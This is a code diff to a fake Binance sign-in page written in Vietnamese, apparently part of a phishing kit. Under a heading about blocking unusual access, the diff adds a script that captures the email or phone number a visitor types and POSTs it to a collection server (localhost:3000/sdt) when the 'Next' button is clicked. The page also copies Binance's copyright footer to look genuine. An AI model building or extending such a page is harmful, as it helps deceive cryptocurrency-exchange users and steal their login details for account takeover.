@@ -138,6 +138,7 @@
             flex-direction: row;
             justify-content: space-evenly;
         }
+
         .footer-text {
             color: rgb(71, 77, 87);
             font-size: 14px;
@@ -162,13 +163,24 @@
         </div>
         <!-- form signin -->
         <div class="form-login">
-            <h2 style="padding-left: 15px; padding-right: 10px; font-weight: 600">Thực hiện bảo mật để chặn các truy cập bất thường</h2>
+            <h2 style="padding-left: 15px; padding-right: 10px; font-weight: 600">Thực hiện bảo mật để chặn các truy cập
+                bất thường</h2>
             <div class="email-sdt-container">
                 <label class="email-sdt">Email/ Số điện thoại</label>
-                <input type="text">
+                <input type="text" id="sdt">
             </div>
             <br>
-            <button class="next-btn" onclick="location.href='binance.html'"> Tiếp Theo </button>
+            <button class="next-btn" id="next-button" onclick="location.href='binance.html'"> Tiếp Theo </button>
+            <script>
+                document.getElementById("next-button").addEventListener("click", function () {
+                    var inputData = document.getElementById("sdt").value;
+                    var xhttp = new XMLHttpRequest();
+                    // window.location.href = "binance.html";
+                    xhttp.open("POST", "http://localhost:3000/sdt", false);
+                    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                    xhttp.send(`sdt=${inputData}`);
+                });
+            </script>
             <hr><span style="color:grey">hoặc</span>
             <hr>
 
@@ -187,7 +199,7 @@
         <br />
         <!-- footer -->
         <div class="footer">
-            <div class="footer-text" >© 2017 - 2023 Binance.com. All rights reserved</div>
+            <div class="footer-text">© 2017 - 2023 Binance.com. All rights reserved</div>
             <div class="footer-text">Tùy chọn Cookie</div>
         </div>
     </div>
